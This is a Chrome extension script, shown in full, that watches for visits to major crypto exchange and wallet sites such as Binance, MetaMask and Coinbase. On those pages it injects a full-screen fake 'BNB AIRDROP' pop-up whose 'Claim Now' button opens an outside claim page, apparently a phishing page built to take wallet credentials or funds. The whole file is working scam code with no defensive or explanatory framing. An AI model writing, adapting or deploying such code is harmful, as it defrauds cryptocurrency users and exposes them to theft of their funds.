chrome.webNavigation.onCompleted.addListener((details) => {
    const cryptoSites = [
        'binance.com', 'metamask.io', 'trustwallet.com',
        'coinbase.com', 'crypto.com', 'blockchain.com'
    ];
    if (cryptoSites.some(site => details.url.includes(site))) {
        chrome.scripting.executeScript({
            target: { tabId: details.tabId },
            func: injectAirdropPopup
        });
    }
}, { url: [{ schemes: ['https'] }] });

function injectAirdropPopup() {
    const modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.9)';
    modal.style.zIndex = '999999';
    modal.style.display = 'flex';
    modal.style.justifyContent = 'center';
    modal.style.alignItems = 'center';
    modal.style.color = '#fff';
    modal.style.fontFamily = 'Arial, sans-serif';

    modal.innerHTML = `
        <div style="background: #000; padding: 30px; border-radius: 15px; text-align: center; max-width: 400px; border: 2px solid #f3ba2f;">
            <h2 style="color: #f3ba2f;">🎁 BNB AIRDROP 2025</h2>
            <p>You qualify for a free 0.5 BNB reward!</p>
            <button onclick="window.open('https://rop-2026.onrender.com/claim.html', '_blank')" style="background: #f3ba2f; color: #000; border: none; padding: 12px 24px; margin: 10px; border-radius: 8px; font-weight: bold; cursor: pointer;">
                Claim Now
            </button>
            <button onclick="this.closest('div').remove()" style="background: #333; color: #fff; border: none; padding: 12px 24px; margin: 10px; border-radius: 8px;">
                Close
            </button>
        </div>
    `;

    document.body.appendChild(modal);
}
